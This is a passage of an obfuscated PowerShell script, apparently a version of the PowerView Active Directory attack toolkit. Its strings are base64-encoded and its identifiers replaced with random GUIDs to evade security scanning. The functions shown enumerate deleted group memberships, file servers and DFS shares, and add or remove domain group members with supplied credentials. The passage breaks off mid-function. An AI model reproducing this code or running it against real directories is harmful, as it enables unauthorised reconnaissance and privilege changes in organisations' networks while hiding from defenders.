            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
            'LDAPFilter'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAKQA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
            ${5c9e4befbd7045278c649df1e23e1dc8} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${6981d33ed3264afe8f122b1054b2eeee} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) {
                ${2d1b3fbce869492e9d8fa38d2a2dc474} = [xml]${6981d33ed3264afe8f122b1054b2eeee} | Select-Object -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA=='))) -ErrorAction SilentlyContinue
                if (${2d1b3fbce869492e9d8fa38d2a2dc474}) {
                    if ((${2d1b3fbce869492e9d8fa38d2a2dc474}.pszAttributeName -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA')))) -and ((${2d1b3fbce869492e9d8fa38d2a2dc474}.dwVersion % 2) -eq 0 )) {
                        ${b01c344f140447efaf17619a650a69ed} = New-Object PSObject
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQATgA='))) ${5c9e4befbd7045278c649df1e23e1dc8}
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABOAA=='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.pszObjectDn
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBGAGkAcgBzAHQAQQBkAGQAZQBkAA=='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.ftimeCreated
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.ftimeDeleted
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.ftimeLastOriginatingChange
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBzAEEAZABkAGUAZAA='))) (${2d1b3fbce869492e9d8fa38d2a2dc474}.dwVersion / 2)
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.pszLastOriginatingDsaDN
                        ${b01c344f140447efaf17619a650a69ed}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBHAHIAbwB1AHAATQBlAG0AYgBlAHIARABlAGwAZQB0AGUAZAA='))))
                        ${b01c344f140447efaf17619a650a69ed}
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBEAGUAbABlAHQAZQBkAF0AIABFAHIAcgBvAHIAIAByAGUAdAByAGkAZQB2AGkAbgBnACAAJwBtAHMAZABzAC0AcgBlAHAAbAB2AGEAbAB1AGUAbQBlAHQAYQBkAGEAdABhACcAIABmAG8AcgAgACcAJAB7ADUAYwA5AGUANABiAGUAZgBiAGQANwAwADQANQAyADcAOABjADYANAA5AGQAZgAxAGUAMgAzAGUAMQBkAGMAOAB9ACcA')))
                }
            }
        }
    }
}
function Add-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${805886bfe59f43f7b547a914109edc67},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${a13aaf2c161345c48ea81638d22fe192} = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${53ae2c08696047c88bed217e22d1fff6} = a1fcecd3120940898e2774ec72768c1d @a13aaf2c161345c48ea81638d22fe192
        if (${53ae2c08696047c88bed217e22d1fff6}) {
            try {
                ${d9df5fc678774e82bffed7271d02d4ca} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${53ae2c08696047c88bed217e22d1fff6}.Context, ${53ae2c08696047c88bed217e22d1fff6}.Identity)
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAZgBpAG4AZABpAG4AZwAgAHQAaABlACAAZwByAG8AdQBwACAAaQBkAGUAbgB0AGkAdAB5ACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
    }
    PROCESS {
        if (${d9df5fc678774e82bffed7271d02d4ca}) {
            ForEach (${20ebd067c548454fa60a45c352c7aeb5} in ${805886bfe59f43f7b547a914109edc67}) {
                if (${20ebd067c548454fa60a45c352c7aeb5} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${20ebd067c548454fa60a45c352c7aeb5}
                    ${158154aa89d641799cf226c8ba10a573} = a1fcecd3120940898e2774ec72768c1d @a13aaf2c161345c48ea81638d22fe192
                    if (${158154aa89d641799cf226c8ba10a573}) {
                        $UserIdentity = ${158154aa89d641799cf226c8ba10a573}.Identity
                    }
                }
                else {
                    ${158154aa89d641799cf226c8ba10a573} = ${53ae2c08696047c88bed217e22d1fff6}
                    $UserIdentity = ${20ebd067c548454fa60a45c352c7aeb5}
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAQQBkAGQAaQBuAGcAIABtAGUAbQBiAGUAcgAgACcAJAB7ADIAMABlAGIAZAAwADYANwBjADUANAA4ADQANQA0AGYAYQA2ADAAYQA0ADUAYwAzADUAMgBjADcAYQBlAGIANQB9ACcAIAB0AG8AIABnAHIAbwB1AHAAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcA')))
                ${20ebd067c548454fa60a45c352c7aeb5} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${158154aa89d641799cf226c8ba10a573}.Context, $UserIdentity)
                ${d9df5fc678774e82bffed7271d02d4ca}.Members.Add(${20ebd067c548454fa60a45c352c7aeb5})
                ${d9df5fc678774e82bffed7271d02d4ca}.Save()
            }
        }
    }
}
function Remove-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${805886bfe59f43f7b547a914109edc67},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${a13aaf2c161345c48ea81638d22fe192} = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${53ae2c08696047c88bed217e22d1fff6} = a1fcecd3120940898e2774ec72768c1d @a13aaf2c161345c48ea81638d22fe192
        if (${53ae2c08696047c88bed217e22d1fff6}) {
            try {
                ${d9df5fc678774e82bffed7271d02d4ca} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${53ae2c08696047c88bed217e22d1fff6}.Context, ${53ae2c08696047c88bed217e22d1fff6}.Identity)
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAZgBpAG4AZABpAG4AZwAgAHQAaABlACAAZwByAG8AdQBwACAAaQBkAGUAbgB0AGkAdAB5ACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
    }
    PROCESS {
        if (${d9df5fc678774e82bffed7271d02d4ca}) {
            ForEach (${20ebd067c548454fa60a45c352c7aeb5} in ${805886bfe59f43f7b547a914109edc67}) {
                if (${20ebd067c548454fa60a45c352c7aeb5} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${20ebd067c548454fa60a45c352c7aeb5}
                    ${158154aa89d641799cf226c8ba10a573} = a1fcecd3120940898e2774ec72768c1d @a13aaf2c161345c48ea81638d22fe192
                    if (${158154aa89d641799cf226c8ba10a573}) {
                        $UserIdentity = ${158154aa89d641799cf226c8ba10a573}.Identity
                    }
                }
                else {
                    ${158154aa89d641799cf226c8ba10a573} = ${53ae2c08696047c88bed217e22d1fff6}
                    $UserIdentity = ${20ebd067c548454fa60a45c352c7aeb5}
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAUgBlAG0AbwB2AGkAbgBnACAAbQBlAG0AYgBlAHIAIAAnACQAewAyADAAZQBiAGQAMAA2ADcAYwA1ADQAOAA0ADUANABmAGEANgAwAGEANAA1AGMAMwA1ADIAYwA3AGEAZQBiADUAfQAnACAAZgByAG8AbQAgAGcAcgBvAHUAcAAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwA=')))
                ${20ebd067c548454fa60a45c352c7aeb5} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${158154aa89d641799cf226c8ba10a573}.Context, $UserIdentity)
                ${d9df5fc678774e82bffed7271d02d4ca}.Members.Remove(${20ebd067c548454fa60a45c352c7aeb5})
                ${d9df5fc678774e82bffed7271d02d4ca}.Save()
            }
        }
    }
}
function a8c7ae528e8e44439e0f84002f04dcb6 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function b8cd147ee32f4703a26d42325d50899a {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                ${54bb3c44a4d54e2393ac11ebfa0656c0} = $Path.split('\\')[2]
                if (${54bb3c44a4d54e2393ac11ebfa0656c0} -and (${54bb3c44a4d54e2393ac11ebfa0656c0} -ne '')) {
                    ${54bb3c44a4d54e2393ac11ebfa0656c0}
                }
            }
        }
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoACEAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQApACgAfAAoAGgAbwBtAGUAZABpAHIAZQBjAHQAbwByAHkAPQAqACkAKABzAGMAcgBpAHAAdABwAGEAdABoAD0AKgApACgAcAByAG8AZgBpAGwAZQBwAGEAdABoAD0AKgApACkAKQA=')))
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQAsAHMAYwByAGkAcAB0AHAAYQB0AGgALABwAHIAbwBmAGkAbABlAHAAYQB0AGgA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain
                ${8b6b7223663c46408c1ab55f22106dd6} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                $(ForEach(${03d95f77d00149e581a0d421be6b56cf} in ${8b6b7223663c46408c1ab55f22106dd6}.FindAll()) {if (${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {b8cd147ee32f4703a26d42325d50899a(${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if (${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {b8cd147ee32f4703a26d42325d50899a(${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if (${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {b8cd147ee32f4703a26d42325d50899a(${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | Sort-Object -Unique
            }
        }
        else {
            ${8b6b7223663c46408c1ab55f22106dd6} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
            $(ForEach(${03d95f77d00149e581a0d421be6b56cf} in ${8b6b7223663c46408c1ab55f22106dd6}.FindAll()) {if (${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {b8cd147ee32f4703a26d42325d50899a(${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if (${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {b8cd147ee32f4703a26d42325d50899a(${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if (${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {b8cd147ee32f4703a26d42325d50899a(${03d95f77d00149e581a0d421be6b56cf}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | Sort-Object -Unique
        }
    }
}
function Get-DomainDFSShare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        function dbd066592fc442d68818ff9708390e7d {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${c624820894e1498d8e6c5eee7e7e970c}
            )
            ${9e90be1d0335462293a72d2fc193fa0b} = ${c624820894e1498d8e6c5eee7e7e970c}
